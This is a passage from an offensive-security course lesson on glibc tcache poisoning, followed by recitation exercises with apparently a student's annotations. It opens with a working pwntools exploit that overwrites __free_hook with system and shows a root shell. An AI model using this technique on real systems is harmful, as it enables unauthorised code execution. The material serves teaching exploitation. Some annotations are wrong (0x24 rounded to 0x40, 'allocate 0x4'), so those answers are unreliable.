gef➤  p/x &__free_hook
$1 = 0x7ff508d41e48
```

Great! Tcache is poisoned. Now we need to allocate those pointers back, including the address of `__free_hook`. The `new` function will not allocate a new `u` struct because it technically still exists, since the pointer was never nulled out. Consequently, the `0x50` bin allocation order is `group`, then `name`. We can set `name` during the allocation to clobber `__free_hook` to point at `system`.

We also need to be mindful of what happens when we trigger `free` after clobbering the hook. Whatever address is passed to `free` will be passed to the address in `free_hook`, which is now system. Therefore we want our very next call to `free` to be a pointer to `/bin/sh`. What is the next thing passed to `free`? We see in `delete` that it is the `bio` pointer. We can simply make the new `bio` equal to `/bin/sh`, and now the `bio` pointer is a `char[] = "/bin/sh"`! All we need to do after the allocations is to send a `delete` command to trigger the shell:

```python
new(p64(system), 'BBBBBBBB', 10, 10, b"/bin/sh\x00")
p.sendline(b'4')
```

```
[DEBUG] Received 0xd bytes:
    b'Enter a bio:\n'
[DEBUG] Sent 0x9 bytes:
    00000000  2f 62 69 6e  2f 73 68 00  0a                        │/bin│/sh·│·│
    00000009
[DEBUG] Received 0x55 bytes:
    b'Please enter an option:\n'
    b' 1. New user\n'
    b' 2. Edit user\n'
    b' 3. Print user\n'
    b' 4. Delete user\n'
    b' > '
[DEBUG] Sent 0x2 bytes:
    b'4\n'
[*] Switching to interactive mode
 [DEBUG] Received 0x1d bytes:
    b'Detaching from process 85650\n'
Detaching from process 85650
$  whoami
[DEBUG] Sent 0x7 bytes:
    b'whoami\n'
[DEBUG] Received 0x5 bytes:
    b'root\n'
root
```

> Note that we don't want to use our `delete` Python function here because it waits for `b'> '` as a part of its routine. Since we pop a shell before the target's `delete` function has a chance to log that character, our attacking `delete` function will hang and not give us the interactive shell.

## Recitation

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#recitation)

#### Recitation 8.0

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#recitation-80)

Given the following requested allocation sizes, what size allocation is returned?
concept: 
- allocated size is bigger than requested size bc of metadata and potential padding

The result is an algorithm where `size returned = ((size requested + 7) & ~0xf) + 0x10`. We see this is the same logic even for the bigger allocations, where `0x300` gets `0x310`, `0x408` gets `0x410` and `0x409` gets `0x420`.

why +7 not +8 if you want 8 bytes for the metadata?

> The exception is the first four allocations, which all fall in the `0x20` bucket. This is because glibc has defined the smallest possible allocation size as `0x20` bytes, so any request `0x18` bytes or smaller fits into that minimum size.

assuming this is glibc heap allocations
- `0x20`?
	- 0x27 rounded up = 0x30
- `0x21`?
	- size returned = 0x21 + 7 rounded up = 0x28 rounded up = 0x30
- `0x24`?
	- size returned = 0x24 + 7 rounded up to be multiple of 16 = 0x3b rounded up = 0x40
- `0x28`
	- size returned = 0x28 + 7  rounded up to be multiple of 16 = 0x2f rounded up = 0x30
- `0x30`? 
	- size returned = (0x30 + 7) & ~0x0000000000001111 + 0x10 = 0x37 & 0x11111...110000 (makes the last hex zero) + 0x10 (round up) =  0x30 + 0x10 = 0x40 
		- in essence: after you add 
	- AND with 1: preserves bit
	- AND with 0: turns off bit
- `0x0`? 0x20 bc smallest possible allocation size as `0x20` bytes
- `0x8`? 0x20 bc smallest possible allocation size as `0x20` bytes

#### Recitation8.1

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#recitation81)

What do the glibc caches contain after the following sequences? What is the order of cached allocations?

```c
void* a = malloc(0x20); // 0x30 will be allocated
void* b = malloc(0x20);
void* c = malloc(0x20);
// will be using tcache for this mem block size
free(a); 
free(b);
free(c); // freed last, but head of the list of tcache
// tcache is like putting the most recently freed mem block at the FRONT
// of linked list
```

```c
void* a = malloc(0x20); 
void* b = malloc(0x20);
void* c = malloc(0x20);
free(c);
free(b);
free(a);
```

```c
void* a = malloc(0x20); // allocate 0x30
void* b = malloc(0x30); // allocate 0x40
void* c = malloc(0x40); // allocate 0x50
// different sized so they go into different caches
free(a);
free(b);
free(c);
```

```c
void* a = malloc(0x0); // allocate 0x20 for all a,b,c
void* b = malloc(0x8);
void* c = malloc(0x10);
free(a);
free(b);
free(c);
```

```c
void* a = malloc(0x20); // allocate 0x30
void* b = malloc(0x408); // allocate 0x4
void* c = malloc(0x409); // 0x420
// tcache only holds sizes up to (including) 0x410
// anything larger goes into unsorted bins (eventually sorted into bins later)
free(a);
free(b);
free(c); // goes into unsorted bin
```

#### Recitation 8.2

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#recitation-82)

Given the following sequences, which address (given by a previously allocated variable) is returned by the final call?

```c
void* a = malloc(0x20); // allocate 0x30 for all
void* b = malloc(0x20);
void* c = malloc(0x20);
free(a);
free(b);
free(c);
// tcache: (head) c-b-a (tail)
void* z = malloc(0x20);  // get c
```

```c
void* a = malloc(0x20);
void* b = malloc(0x20);
void* c = malloc(0x20);
free(c);
free(b);
free(a);
void* z = malloc(0x20); // get a
```

```c
void* a = malloc(0x20); // 0x30
void* b = malloc(0x30); // 0x40
void* c = malloc(0x40); // 0x50
free(a);
free(b);
free(c);
void* z = malloc(0x20);// get a cuz that's the only one in the 0x30 cache
```

```c
void* a = malloc(0x0);
void* b = malloc(0x8);
void* c = malloc(0x10);
free(a);
free(b);
free(c);
void* z = malloc(0x20);
```

```c
void* a = malloc(0x20);
void* b = malloc(0x408);
void* c = malloc(0x409);
free(a); // go into 0x30 cache
free(b);
free(c); 
void* z = malloc(0x20); // get a cuz that's the only one in the 0x30 cache
```

#### Recitation 8.3

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#recitation-83)

Given a UAF vulnerability providing the ability to edit any of the following allocations, which one would we edit to poison tcache? What would our payload be if we could read bytes into the UAF'd allocation?

```c
void* a = malloc(0x20);
void* b = malloc(0x20);
void* c = malloc(0x20);
free(a);
free(b);
free(c);
```

#### Recitation 8.4

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#recitation-84)

Given a buffer overflow vulnerability providing the ability to edit any of the following allocations, which one would we edit to poison tcache? What would our payload be if we could overflow the freed allocation's (previously allocated) buffer?

```c
void* a = malloc(0x20);
void* b = malloc(0x20);
void* c = malloc(0x20);
free(a);
free(b);
free(c);
```

## Next Steps

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#next-steps)

As mentioned, the tcache attack strategy presented in this lesson targets the glibc heap for versions of glibc <2.32. Starting in version 2.32, glibc developers introduced some key corruption mitigations into the standard allocation and deallocation code that prevents this exact strategy from working against modern targets.

In the next lesson we'll cover these mitigations and discover how we can bypass them given certain conditions and control. We'll also show how we can use a heap buffer overflow or UAF to pivot back to the stack and leverage our experience with ROP payloads to hijack execution flow!